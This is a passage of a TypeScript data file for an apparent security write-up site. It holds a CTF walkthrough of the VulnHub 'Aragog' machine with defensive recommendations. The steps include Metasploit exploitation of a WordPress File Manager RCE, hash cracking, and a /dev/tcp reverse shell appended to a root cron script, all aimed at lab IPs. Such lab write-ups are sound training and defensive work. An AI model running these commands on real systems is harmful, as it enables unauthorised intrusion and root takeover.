        'Deploy file integrity monitoring (AIDE, Tripwire, Wazuh FIM) to detect script modifications',
        'Monitor cron activity with a SIEM for anomalous outbound connections',
      ],
    },
  ],
  attackChain: [
    { step: 1, phase: 'Reconnaissance',      title: 'IP Discovery & Port Scan',           description: 'netdiscover/arp-scan reveals target at 192.168.31.34. Nmap full scan identifies ports 22 (SSH/OpenSSH 7.9p1) and 80 (HTTP/Apache 2.4.38 Debian).', commands: ['nmap -sV -sC -A 192.168.31.34'] },
    { step: 2, phase: 'Web Enumeration',      title: 'Gobuster Directory Brute-Force',     description: 'Gobuster identifies /index.html (200) and /blog (200, 13918 bytes). The /blog directory reveals a WordPress CMS installation.', commands: ['gobuster dir -u 192.168.31.34 -w /usr/share/wordlists/dirb/common.txt -r'] },
    { step: 3, phase: 'WordPress Scanning',   title: 'WPScan Analysis',                    description: 'WPScan identifies WordPress 5.0.12 (insecure), XML-RPC enabled at /blog/xmlrpc.php, WP-Cron enabled, and readme.html exposed.', commands: ['wpscan --url http://192.168.31.34/blog'] },
    { step: 4, phase: 'Exploitation',         title: 'CVE-2020-25213 — WP File Manager RCE', description: 'Metasploit module exploit/multi/http/wp_file_manager_rce exploits the elFinder endpoint to upload a PHP webshell and return a Meterpreter session.', commands: ['use exploit/multi/http/wp_file_manager_rce', 'set RHOSTS 192.168.31.34', 'set RPORT 80', 'set TARGETURI /blog', 'set LHOST 192.168.31.38', 'set LPORT 4444', 'run'], result: 'Meterpreter session opened' },
    { step: 5, phase: 'Post-Exploitation',    title: 'LinPEAS Enumeration',                description: 'LinPEAS uploaded and executed via Python3 HTTP server. Discovers MySQL credentials in wp-config.php: DB_PASSWORD mySecr3tPass, DB_USER root.', commands: ['python3 -m http.server 8080', 'wget http://192.168.31.38:8080/linpeas.sh', 'chmod +x linpeas.sh && ./linpeas.sh'] },
    { step: 6, phase: 'Database Dump',        title: 'MySQL Access & User Hash Extraction', description: 'MySQL accessed as root using discovered credentials. WordPress database dumped. User hagrid98 found with PHPass hash in wp_users table.', commands: ['mysql -u root -pmySecr3tPass', 'SHOW DATABASES;', 'USE wordpress;', 'SELECT * FROM wp_users;'] },
    { step: 7, phase: 'Hash Cracking',        title: 'John the Ripper — PHPass Cracked',   description: "PHPass hash saved to file and cracked with John the Ripper using rockyou.txt. Password 'password123' cracked in under 30 seconds.", commands: ["echo '$P$BYdTic1NGSbBJbpVEMiJoAiNJDHtc.' > hash", 'john --wordlist=/usr/share/wordlists/rockyou.txt hash'], result: 'hagrid98:password123' },
    { step: 8, phase: 'Lateral Movement',     title: 'SSH Login — First Horcrux',          description: 'SSH login as hagrid98:password123 succeeds. First Horcrux found in home directory.', commands: ['ssh hagrid98@192.168.31.34'], result: 'First Horcrux captured' },
    { step: 9, phase: 'Privilege Escalation', title: 'Cronjob Abuse — Root Shell',         description: 'pspy reveals /opt/.backup.sh runs as root. File is writable by hagrid98. Reverse shell injected. Cronjob fires, Netcat receives root connection.', commands: ['nc -nvlp 1337', '# Overwrite backup.sh with reverse shell\necho "sh -i >& /dev/tcp/192.168.31.38/1337 0>&1" >> /opt/.backup.sh'], result: 'uid=0(root) — Second Horcrux captured' },
  ],
  sections: [
    {
      id: 'lab-setup',
      title: '1. Lab Setup & Overview',
      content: 'Harry Potter: Aragog is a beginner-to-intermediate VulnHub machine themed around the Harry Potter universe. The objective is to find two hidden Horcruxes by exploiting a vulnerable WordPress installation and escalating privileges to root. The machine is imported into VirtualBox with the network adapter set to Bridged mode to allow host-to-machine communication.',
    },
    {
      id: 'reconnaissance',
      title: '2. Initial Reconnaissance — IP Discovery',
      content: 'After booting the target VM, we need to identify its IP address on the local network. A quick netdiscover or arp-scan reveals the target at 192.168.31.34.',
    },
    {
      id: 'nmap',
      title: '3. Port Scanning with Nmap',
      content: "Nmap reveals two open ports — Port 22 (SSH) running OpenSSH 7.9p1 and Port 80 (HTTP) running Apache 2.4.38 on Debian. The machine is one hop away, confirming it's on the same LAN segment.",
      subsections: [
        {
          title: 'Key Findings',
          content: 'SSH is open — useful for lateral movement later. Apache web server is running — web enumeration next.',
          commands: ['nmap -sV -sC -A 192.168.31.34'],
        },
      ],
    },
    {
      id: 'web-enumeration',
      title: '4. Web Enumeration — Gobuster',
      content: 'Gobuster identifies two accessible paths: /index.html (Status 200) and /blog (Status 200, Size: 13918). The /blog directory is the most interesting find as it suggests a CMS installation. Navigating to the web root presents a Harry Potter-themed landing page — a simple static site serving as a decoy.',
      subsections: [
        {
          title: 'Gobuster Scan',
          content: 'Two paths discovered: /index.html and /blog. The /blog path reveals a full WordPress installation.',
          commands: ['gobuster dir -u 192.168.31.34 -w /usr/share/wordlists/dirb/common.txt -r'],
        },
      ],
    },
    {
      id: 'wordpress',
      title: '5. WordPress Discovery & WPScan',
      content: 'Visiting http://192.168.31.34/blog confirms a WordPress installation. A "Notice" post hints at unused plugins being deleted for security — actually a clue about a vulnerable plugin present now. WPScan identifies WordPress 5.0.12 (insecure), XML-RPC enabled, WP-Cron exposed, and readme.html accessible.',
      subsections: [
        {
          title: 'WPScan Findings',
          content: 'WordPress 5.0.12 released 2021-04-15 — Insecure. XML-RPC enabled at /blog/xmlrpc.php. External WP-Cron enabled. Readme exposed at /blog/readme.html.',
          commands: ['wpscan --url http://192.168.31.34/blog'],
          note: 'XML-RPC enabled + outdated WordPress = multiple attack vectors available.',
        },
      ],
    },
    {
      id: 'exploitation',
      title: '6. Exploitation — WP File Manager RCE via Metasploit',
      content: 'WordPress 5.0.12 with the File Manager plugin (v6.0–6.8) is vulnerable to an unauthenticated Remote Code Execution (RCE) vulnerability (CVE-2020-25213). This flaw in the elFinder component allows an attacker to upload a malicious PHP file and execute arbitrary commands.',
      subsections: [
        {
          title: 'Metasploit Module Configuration',
          content: 'The exploit uploads a PHP payload to /blog/wp-content/plugins/wp-file-manager/lib/files/ and triggers a reverse Meterpreter shell back to our listener.',
          commands: [
            'use exploit/multi/http/wp_file_manager_rce',
            'set RHOSTS 192.168.31.34',
            'set RPORT 80',
            'set TARGETURI /blog',
            'set LHOST 192.168.31.38',
            'set LPORT 4444',
            'run',
          ],
          note: 'CVE-2020-25213 | CVSS 9.8 Critical | Plugin: WP File Manager 6.0–6.8 | Fixed: 6.9',
        },
      ],
    },
    {
      id: 'post-exploitation',
      title: '7. Post-Exploitation — LinPEAS & DB Credentials',
      content: 'With shell access on the target, we upload and run LinPEAS to automatically identify potential escalation paths. LinPEAS discovers MySQL credentials in wp-config.php: DB_PASSWORD mySecr3tPass and DB_USER root.',
      subsections: [
        {
          title: 'LinPEAS Transfer and Execution',
          content: 'Transfer LinPEAS via Python HTTP server, execute, and review output for credential exposure.',
          commands: [
            '# On attacker machine:\npython3 -m http.server 8080',
            '# On target shell:\nwget http://192.168.31.38:8080/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh',
          ],
        },
        {
          title: 'MySQL Database Dump',
          content: 'Access MySQL as root using discovered credentials. Dump the WordPress users table to extract the hagrid98 PHPass hash.',
          commands: [
            'mysql -u root -pmySecr3tPass',
            'SHOW DATABASES;',
            'USE wordpress;',
            'SELECT * FROM wp_users;',
          ],
        },
      ],
    },
    {
      id: 'hash-cracking',
      title: '8. Hash Cracking with John the Ripper',
      content: 'The WordPress user hagrid98 has a PHPass hashed password stored in the database. We save the hash to a file and use John the Ripper with the popular rockyou.txt wordlist to crack it.',
      subsections: [
        {
          title: 'Crack PHPass Hash',
          content: "John the Ripper successfully cracks the hash in under 30 seconds: password = 'password123'.",
          commands: [
            "echo '$P$BYdTic1NGSbBJbpVEMiJoAiNJDHtc.' > hash",
            'john --wordlist=/usr/share/wordlists/rockyou.txt hash',
          ],
          note: "Credentials: hagrid98 : password123",
        },
      ],
    },
    {
      id: 'ssh-login',
      title: '9. SSH Login as hagrid98 — First Horcrux',
      content: 'Using the cracked credentials, we log into the machine via SSH and obtain our first interactive shell as user hagrid98. Exploring the home directory reveals the First Horcrux.',
      subsections: [
        {
          title: 'SSH Access & Flag Capture',
          content: "SSH login successful. whoami confirms hagrid98. First Horcrux found in ~/horcrux1.txt.",
          commands: ['ssh hagrid98@192.168.31.34  # Password: password123', 'cat ~/horcrux1.txt'],
          note: "First Horcrux: \"1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets\"",
        },
      ],
    },
    {
      id: 'privesc',
      title: '10. Privilege Escalation via Cronjob Abuse',
      content: 'To escalate to root, we use pspy to monitor background processes without root privileges. We discover that /opt/.backup.sh runs periodically as root — and crucially, the file is writable by our current user hagrid98.',
      subsections: [
        {
          title: 'Cronjob Discovery & Exploitation',
          content: 'Inject a bash reverse shell into /opt/.backup.sh. Set up a Netcat listener. Wait for cron to fire. Root shell received.',
          commands: [
            '# Set up listener on attacker:\nnc -nvlp 1337',
            '# Overwrite cronjob with reverse shell:\necho "sh -i >& /dev/tcp/192.168.31.38/1337 0>&1" >> /opt/.backup.sh',
            '# Wait ~60 seconds for cron execution\n# Root shell received on listener',
            'whoami\n# → root',
          ],
          note: 'pspy reveals hidden dot-prefixed processes (/opt/.backup.sh) regardless of naming — "security through obscurity" is not security.',
        },
      ],
    },
    {
      id: 'root-flag',
      title: '11. Root Shell & Second Horcrux',
      content: 'After the cron job executes, our Netcat listener receives a root connection. The Second Horcrux is found in the root home directory.',
      subsections: [
        {
          title: 'Root Access & Final Flag',
          content: 'Root shell confirmed. Second Horcrux captured from /root/horcrux2.txt.',
          commands: ['cat /root/horcrux2.txt'],
          note: "Second Horcrux: \"2: maRvoLo GaUnt's riNg deStROyed bY DUmbledOre\"",
        },
      ],
    },
  ],
  flags: [
    { name: 'Horcrux 1 (hagrid98)', value: "Riddle's Diary destroyed by Harry in Chamber of Secrets" },
    { name: 'Horcrux 2 (root)',     value: "Marvolo Gaunt's Ring destroyed by Dumbledore" },
  ],
  conclusion: `Harry Potter: Aragog demonstrates a classic WordPress attack chain that remains relevant in real-world penetration testing. The machine emphasises that a single unpatched plugin with a public CVE (CVE-2020-25213) can provide a complete foothold on a system.

The privilege escalation via a writable root-owned cronjob requires no CVE at all — it is a pure misconfiguration that file permission audits would have caught. Together these findings illustrate that both patching discipline and least-privilege file permission enforcement are essential defensive controls.

The attack chain: WPScan → Metasploit RCE → LinPEAS → MySQL dump → John the Ripper → SSH → pspy → cronjob abuse → root, is a pattern that appears in real-world engagements against poorly maintained WordPress servers.`,
  recommendations: {
    immediate: [
      'Update WP File Manager to version 6.9+ immediately',
      'Enforce chmod 700 on /opt/.backup.sh and chown root:root — no world-writable cron scripts',
      'Remove plaintext credentials from wp-config.php; use environment variables or secrets manager',
      'Change all passwords: enforce minimum 16 characters, enable 2FA on WordPress admin',
    ],
    shortTerm: [
      'Disable XML-RPC if not required: add_filter("xmlrpc_enabled","__return_false")',
      'Remove /blog/readme.html to prevent version disclosure',
      'Use a dedicated non-root WordPress MySQL user with minimal privileges',
      'Replace WP-Cron with a real system cron: add DISABLE_WP_CRON to wp-config.php',
      'Deploy Wordfence or ModSecurity WAF',
      'Implement file integrity monitoring (Wazuh FIM, AIDE, Tripwire)',
    ],
    longTerm: [
      'Deploy a SIEM/HIDS to alert on cron modifications and new PHP files in plugin directories',
      'Bind MySQL to 127.0.0.1 and enforce network segmentation',
      'Conduct regular WordPress security audits and plugin reviews',
      'Subscribe to WPVulnDB/Wordfence Intel for CVE alerts on installed plugins',
    ],
  },
  references: [
    { title: 'VulnHub — Harry Potter: Aragog', url: 'https://www.vulnhub.com/entry/harry-potter-aragog-102,688/' },
    { title: 'CVE-2020-25213 — NVD',           url: 'https://nvd.nist.gov/vuln/detail/CVE-2020-25213' },
    { title: 'LinPEAS',                         url: 'https://github.com/carlospolop/PEASS-ng' },
    { title: 'pspy',                            url: 'https://github.com/DominicBreuker/pspy' },
  ],
};

// ============================================================
// EXPORT
// ============================================================
export const reports: Report[] = [jangow01, aragog];

export const getReportById = (id: string): Report | undefined =>
  reports.find((r) => r.id === id);

export const getRelatedReports = (current: Report, limit = 3): Report[] =>
  reports
    .filter((r) => r.id !== current.id)
    .filter((r) =>
      r.tags.some((tag) => current.tags.includes(tag)) ||
      r.platform === current.platform ||
      r.type === current.type
    )
    .slice(0, limit);

// ── FIXED: Array.from() instead of [...new Set()] spread ──────────────────
export const getAllTags = (): string[] =>
  Array.from(new Set(reports.flatMap((r) => r.tags))).sort();

export const getAllPlatforms = (): Platform[] =>
  Array.from(new Set(reports.map((r) => r.platform)));

export const getAllTypes = (): ReportType[] =>
  Array.from(new Set(reports.map((r) => r.type)));

export const severityColor: Record<Severity, string> = {
  CRITICAL: '#ff3b3b',
  HIGH:     '#ff8c00',
  MEDIUM:   '#f5c518',
  LOW:      '#00c2a8',
  INFO:     '#6b7a99',
};